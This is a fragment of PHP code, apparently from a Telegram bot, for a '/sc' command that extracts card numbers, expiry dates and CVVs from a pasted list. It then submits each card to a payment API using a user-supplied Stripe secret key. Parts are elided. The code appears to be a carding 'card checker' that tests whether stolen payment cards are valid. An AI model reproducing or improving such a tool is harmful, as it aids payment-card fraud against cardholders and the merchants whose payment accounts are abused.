...
////////////====[MUTE]====////////////
if (strpos($message, "/sc ") === 0 || strpos($message, "!sc ") === 0) {
  ...
  if (preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
   ...
   if (!preg_match_all("/sk_(test|live)_[A-Za-z0-9]+/", $sec, $matches)) {
    bot('editMessageText', [
     ...
     'text' => "<b>Add a SK Key First by using /addsk command.</b>",
     'parse_mode' => 'html',
   ...
   curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=isnotdev deposit &card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mon.'&card[exp_year]='.$year);
   $result = curl_exec($ch);
